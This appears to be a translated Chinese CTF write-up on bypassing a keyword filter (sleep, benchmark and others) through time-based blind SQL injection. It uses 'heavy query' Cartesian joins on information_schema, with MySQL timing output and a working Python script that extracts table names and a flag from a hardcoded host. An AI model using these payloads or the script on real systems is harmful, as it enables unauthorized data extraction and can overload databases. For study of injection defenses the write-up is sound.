# pwnhub time injection带来的新思路
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
前几天pwnhub的一道新题`全宇宙最最简单的PHP博客系统`,带来了不少time injection的新思路，今天写这篇文章研究一下
## 题目分析
题目直接给出了源码  
核心代码非常少，我就把漏洞文件的代码全部给出了  
article.php
注意到题目功能非常少：
    conn.php  连接文件
    index.php  主页
    article.php  文章页面
而核心代码只有article.php十几行  
所提供的线索即
    1.查询文章
    2.记录查看次数
我们逐句分析，发现在查询的时候
    $sql = "select * from article where id='".intval($id)."'";
我们传入的参数会被强转int，这里显然就不存在注入了  
然后是更新查看次数的地方，处理非常简单
    if(preg_match("/(sleep|benchmark|outfile|dumpfile|load_file|join)/i", $_GET['id']))
    {
        die("you bad bad!");
    }
可以看到一些危险函数
    outfile dumpfile load_file
都已经被过滤了  
然后有关时间的函数
    sleep benchmark
数都被过滤  
但是不难发现
    select or and ()
等常用字符都还存在，那么能不能进行注入呢？  
首先我们可以确定  
此题应该用的是时间注入  
但是时间相关函数都被过滤了，我们如何进行时间盲注呢？  
这里有3种发散思维的解法，我在这里都总结了一下，以便日后的使用
## Heavy Query
个人认为这个方法是本题的最优解  
原理就如方法的名字：大负荷查询  
即用到一些消耗资源的方式让数据库的查询时间尽量变长  
而消耗数据库资源的最有效的方式就是让两个大表做笛卡尔积，这样就可以让数据库的查询慢下来  
而最后找到系统表information_schema数据量比较大，可以满足要求，所以我们让他们做笛卡尔积。  
我们看一下数量
    mysql> select count(*) from information_schema.tables;
    +----------+
    | count(*) |
    +----------+
    |      298 |
    +----------+
不难看到系统表里共有298行数据  
同样的
    mysql> select count(*) from information_schema.COLUMNS;
    +----------+
    | count(*) |
    +----------+
    |     3131 |
    +----------+
    1 row in set (0.08 sec)
不难看出系统库数据之多  
倘若我们对如此大量的数据进行2次甚至3次以上的笛卡尔积运算，运算量是非常可观的  
不妨进行一些本地测试，当然这里的延时时间和本地数据库内容的量有关  
尝试1：使用3列
    select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);
结果
    +----+-------------------------------------+
    | id | content                             |
    +----+-------------------------------------+
    |  1 | I think you may need sql injection! |
    +----+-------------------------------------+
    1 row in set (21 min 23.49 sec)
延时高达21min  
尝试2：使用2列+1表
    select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.Tables C);
结果
    +----+-------------------------------------+
    | id | content                             |
    +----+-------------------------------------+
    |  1 | I think you may need sql injection! |
    +----+-------------------------------------+
    1 row in set (2 min 4.42 sec)
延时大约在2分钟左右  
尝试3：使用2列+1库
    select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);
结果
    +----+-------------------------------------+
    | id | content                             |
    +----+-------------------------------------+
    |  1 | I think you may need sql injection! |
    +----+-------------------------------------+
    1 row in set (4.47 sec)
延时大约在5s左右  
所以大家可以看见，想要多大的负荷都可以自己调整，如果连3列都嫌少，还可以
    select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C,information_schema.columns D,information_schema.columns E .....);
想要多少有多少，可以说机动性很强了  
应用起来也很容易，一般情况下，我们的盲注是这样测试的
    id = 1' and 1 and sleep(5)%23
    id = 1' and 0 and sleep(5)%23
前者会sleep 5秒，而后者瞬间响应  
用heavy query也是同理
    id = 1' and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
    id = 1' and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
以我本地为例
    mysql> select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);
    +----+-------------------------------------+
    | id | content                             |
    +----+-------------------------------------+
    |  1 | I think you may need sql injection! |
    +----+-------------------------------------+
    1 row in set (4.91 sec)
    mysql> select * from content where id = 1 and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);
    Empty set (0.00 sec)
结果显而易见，为此我们就可以轻松写出盲注脚本
    import requests
    url = "http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23"
    data = ""
    for i in range(1,1000):
        for j in range(33,127):
            #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
            #payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
            #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
            payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
            payload_url = url%(payload)
            try:
                r = requests.get(url=payload_url,timeout=8)
            except:
                data +=chr(j)
                print data
                break
即可探测到数据库为
    post
表为
    article,flags